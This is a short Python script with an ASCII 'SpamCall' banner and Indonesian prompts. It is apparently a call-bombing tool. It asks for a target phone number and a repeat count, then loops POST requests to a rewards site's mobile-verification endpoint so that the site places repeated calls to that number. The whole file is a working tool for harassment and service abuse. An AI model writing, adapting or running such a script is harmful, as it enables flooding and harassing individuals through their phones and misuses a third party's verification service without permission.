import os,sys,time,requests

logo = """

____                         ____      _ _
/ ___| _ __   __ _ _ __ ___  / ___|__ _| | |
\___ \| '_ \ / _` | '_ ` _ \| |   / _` | | |
 ___) | |_) | (_| | | | | | | |__| (_| | | |
|____/| .__/ \__,_|_| |_| |_|\____\__,_|_|_|
      |_|
"""

time.sleep(1)
os.system("clear")
print(logo)
print(" Example (8799xxxxxxxx")
nomor = input(" Nomor Target > ")
jumlah = int(input(" Jumlah Spam > "))
time.sleep(1)

url = "https://id.jagreward.com/member/verify-mobile/"
ua = {'Host': "id.jagreward.com",'Connection': "keep-alive",'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWbKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36'}
dat = {"method": "CALL","countryCode": "id",}

for i in range(jumlah):
        send = requests.post(url+nomor, headers=ua, data=dat)
        print(" [-] Status >",(send.json()["message"]))

